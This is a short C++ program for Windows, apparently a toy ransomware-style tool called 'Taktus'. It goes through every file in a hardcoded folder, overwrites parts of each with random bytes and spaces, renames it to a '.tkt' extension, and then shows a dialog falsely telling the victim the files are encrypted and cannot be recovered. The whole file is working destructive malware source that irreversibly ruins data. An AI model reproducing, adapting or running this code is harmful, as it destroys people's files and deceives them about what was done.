#include <windows.h>
#include <string>
#include <iostream>
#include <fstream>


void corruptFile(const std::string& fileName)
{
   //generate random number from 500 to 10000
    int randNum = rand() % (10000 - 500 + 1) + 500;
    // Open the file in binary mode
    std::ofstream file(fileName, std::ios::binary | std::ios::out | std::ios::in);

    // Check if the file is open
    if (file.is_open())
    {
        // Get the file size
        file.seekp(0, std::ios::end);
        std::streampos fileSize = file.tellp();

        // Go to the middle of the file
        file.seekp(fileSize / 2);

        // Write a random 500 character to the file
        for (int i = 0; i < randNum; ++i)
        {
            char randomChar = rand() % 256;
            file.write(&randomChar, 1);
        }

        //delete a 500 random character from the file
        for (int i = 0; i < randNum; ++i)
        {
        file.seekp(rand() % fileSize);
        file.put(' ');
        }

    

        // Close the file
        file.close();
    }
}

int main()
{
    std::string dir = "C:\\taktus";
    std::string newExt = ".tkt";

    // Open the directory
    HANDLE hFind;
    WIN32_FIND_DATA data;
    hFind = FindFirstFile((dir + "\\*").c_str(), &data);
    if (hFind != INVALID_HANDLE_VALUE)
    {
        // Iterate over the files in the directory
        do
        {
            // Skip directories
            if ((data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0)
            {
                // Get the file name and extension
                std::string fileName = data.cFileName;
                size_t dotPos = fileName.find_last_of(".");
                std::string fileExt = fileName.substr(dotPos);

                // Build the new file name
                std::string newName = dir + "\\" + fileName.substr(0, dotPos) + newExt;

                // Corrupt the file
                corruptFile(dir + "\\" + fileName);

                // Rename the file
                if (!MoveFile((dir + "\\" + fileName).c_str(), newName.c_str()))
                {
                    std::cout << "Error renaming file: " << fileName << std::endl;
                }
            }
        } while (FindNextFile(hFind, &data));
        FindClose(hFind);
    }

    //display a dialog box after execution and help button
    MessageBox(NULL, "Your files have been Encrypted \n No you cannot recover them", "Taktus", MB_OK);


    return 0;
}
